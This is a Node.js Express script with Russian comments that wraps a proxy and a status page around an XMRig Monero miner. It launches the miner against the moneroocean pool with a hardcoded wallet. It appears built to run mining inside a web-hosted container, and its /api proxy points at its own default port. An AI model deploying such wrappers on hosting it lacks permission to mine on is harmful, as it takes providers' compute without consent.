const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const { spawn } = require('child_process');

const app = express();
const port = process.env.PORT || 3000;

// Логируем все запросы для отладки
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next();
});

// Стартовая страница
app.get('/', (req, res) => {
  res.send(`
    <html>
      <head><title>XMRig Monitor</title></head>
      <body style="font-family: sans-serif; text-align: center; padding: 40px;">
        <h1>⛏️ XMRig Monitor</h1>
        <p>Майнер запущен и работает.</p>
        <p><a href="/workers" target="_blank">📊 Открыть xmrig-workers</a></p>
        <p><a href="/api" target="_blank">📡 Открыть API майнера</a></p>
        <p style="margin-top: 40px; color: #888; font-size: 0.9rem;">
          Хешрейт: <span id="hashrate">загрузка...</span>
        </p>
        <script>
          setInterval(async () => {
            try {
              const res = await fetch('/api/2/summary');
              const data = await res.json();
              document.getElementById('hashrate').textContent = 
                (data.hashrate.total[0] / 1000).toFixed(2) + ' KH/s';
            } catch(e) {
              document.getElementById('hashrate').textContent = 'недоступно';
            }
          }, 5000);
        </script>
      </body>
    </html>
  `);
});

// Прокси для xmrig-workers (порт 3001)
app.use('/workers', createProxyMiddleware({
  target: 'http://localhost:3001',
  changeOrigin: true,
  pathRewrite: { '^/workers': '' },
}));

// Прокси для API XMRig (порт 3000)
app.use('/api', createProxyMiddleware({
  target: 'http://localhost:3000',
  changeOrigin: true,
  pathRewrite: { '^/api': '' },
}));

// Запускаем сервер и затем майнер
const server = app.listen(port, '0.0.0.0', () => {
  console.log(`✅ Proxy server running on port ${port}`);
  console.log('🚀 Starting miner...');
  
  // Запускаем майнер как дочерний процесс, передавая логи в stdout
  const miner = spawn('/entrypoint.sh', [
    '-o', 'gulf.moneroocean.stream:10004',
    '-u', '48oFiSuK4K4WBpQ29kx73CBRtSpm132W2hoXr9RyfUbUCrbvgqLV9PBH1aqyckZemdabBjrwM2D3YieJQD6CKiGZVgkxU36',
    '-p', 'x',
    '-k',
    '-t', '2'
  ], { stdio: 'inherit' });

  miner.on('error', (err) => {
    console.error('❌ Miner error:', err);
  });

  miner.on('exit', (code) => {
    console.log(`⛔ Miner exited with code ${code}`);
    process.exit(code);
  });
});

// Обработка завершения процесса
process.on('SIGTERM', () => {
  console.log('Received SIGTERM, shutting down...');
  server.close(() => process.exit(0));
});
